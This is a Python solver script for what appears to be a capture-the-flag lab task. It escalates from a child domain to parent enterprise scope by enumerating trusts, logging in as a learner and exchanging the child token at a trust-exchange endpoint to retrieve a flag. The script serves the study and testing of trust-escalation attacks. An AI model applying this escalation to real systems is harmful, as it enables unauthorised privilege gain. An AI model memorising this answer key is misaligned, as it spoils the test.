"""Intended-path solver: chain a child domain token into parent enterprise scope."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    child = {"Host": "child.corp"}
    parent = {"Host": "parent.corp"}
    detail = None
    captured = None

    trusts = httpx.get(f"{base}/trusts", headers=child, timeout=10).json()
    doc = (trusts.get("trusts") or [{}])[0]
    if not doc.get("transitive"):
        detail = "child /trusts did not describe a transitive link"

    auth = httpx.post(
        f"{base}/auth",
        headers={**child, "Content-Type": "application/json"},
        content=b'{"user": "learner", "password": "learner"}',
        timeout=10,
    )
    child_token = auth.json().get("token")
    if not child_token:
        detail = f"child /auth returned no token: {auth.text[:200]}"

    exchange = httpx.post(
        f"{base}/trust-exchange",
        headers={**parent, "Content-Type": "application/json"},
        content=f'{{"child_token": "{child_token}"}}'.encode(),
        timeout=10,
    )
    parent_token = exchange.json().get("token")
    if not parent_token:
        detail = f"parent /trust-exchange returned no token: {exchange.text[:200]}"

    final = httpx.get(
        f"{base}/enterprise/path",
        headers={**parent, "Authorization": f"Bearer {parent_token}"},
        timeout=10,
    )
    flags = find_flags(final.text)
    if flags:
        captured = flags[0]
    elif detail is None:
        detail = f"enterprise path carried no flag: {final.text[:200]}"

    return SolveResult(
        results=[
            TaskResult(
                task_id="parent-enterprise-flag",
                ok=captured is not None,
                captured=captured,
                detail=detail,
            )
        ]
    )
